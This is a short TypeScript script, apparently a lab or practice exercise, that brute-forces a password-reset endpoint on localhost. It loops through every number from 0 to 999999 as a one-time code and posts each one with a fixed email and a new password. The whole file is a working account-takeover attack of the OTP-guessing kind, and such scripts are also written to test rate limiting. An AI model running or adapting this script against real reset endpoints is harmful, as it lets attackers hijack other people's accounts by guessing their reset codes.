import axios from 'axios';


async function sendRequest(otp:string) {
    let data = JSON.stringify({
        "email":"testing@gmail.com",
        "otp":otp,
        "newPassword":"123123123"
    });

    let config = {
        method:'post',
        maxBodyLength: Infinity,
        url:'https://localhost:3000/reset-password',
        data:data
    };
    await axios.request(config)
    return  0;
}
for(let i = 0; i<=999999; i++){
    console.log(i);
    sendRequest(i.toString());
}